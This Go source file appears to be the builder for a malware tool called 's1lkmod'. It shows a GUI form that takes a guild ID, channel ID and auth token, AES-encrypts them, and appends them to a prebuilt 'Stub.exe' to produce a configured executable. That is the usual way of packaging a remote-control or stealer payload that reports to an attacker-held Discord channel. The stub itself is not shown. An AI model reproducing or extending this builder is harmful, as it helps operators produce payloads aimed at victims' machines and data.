package main

import (
	"fmt"
	"io/ioutil"
	"os"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

var delimiter = "\nSuperCoolDelimiter\n"

func main() {
	myApp := app.New()
	myWindow := myApp.NewWindow("s1lkmod")
	myWindow.Resize(fyne.NewSize(400, 400))
	guildId := widget.NewEntry()
	channelId := widget.NewEntry()
	authToken := widget.NewEntry()
	label := widget.NewLabel("")
	form := &widget.Form{
		Items: []*widget.FormItem{ // we can specify items in the constructor
			{Text: "Guild Id", Widget: guildId},
			{Text: "Channel Id", Widget: channelId},
			{Text: "Auth token", Widget: authToken}},
		OnSubmit: func() { // optional, handle form submission
			bytes, err := ioutil.ReadFile("Stub.exe")
			guildId := AesEncrypt0(guildId.Text)
			channelId := AesEncrypt0(channelId.Text)
			authToken := AesEncrypt0(authToken.Text)
			if err != nil {
				label.Text = "An error has occured while building"
			}
			file, err := os.Create("s1lkmod.exe")
			if err != nil {
				label.Text = "An error has occured while building"
			}
			file, err = os.OpenFile("s1lkmod.exe", os.O_WRONLY|os.O_APPEND, 0777)
			if err != nil {
				label.Text = "An error has occured while building"
			}
			// file.Write(bytes)
			// file.Write([]byte(delimiter))
			// file.Write([]byte(guildId.Text))
			// file.Write([]byte(delimiter))
			// file.Write([]byte(channelId.Text))
			// file.Write([]byte(delimiter))
			// file.Write([]byte(authToken.Text))
			file.Write(bytes)
			file.Write([]byte(delimiter))
			file.Write([]byte(guildId))
			file.Write([]byte(delimiter))
			file.Write([]byte(channelId))
			file.Write([]byte(delimiter))
			file.Write([]byte(authToken))
			label.Text = "File was built..."
			label.Refresh()

		},
	}
	encryptDelimiter := AesEncrypt1(delimiter)
	fmt.Println("Encrypted delimeter: ", encryptDelimiter)
	fmt.Println("Decoded delimiter: ", AesDecrypt1(encryptDelimiter))

	// we can also append items

	myWindow.SetContent(container.NewVBox(
		form,
		label,
	))
	myWindow.ShowAndRun()
}
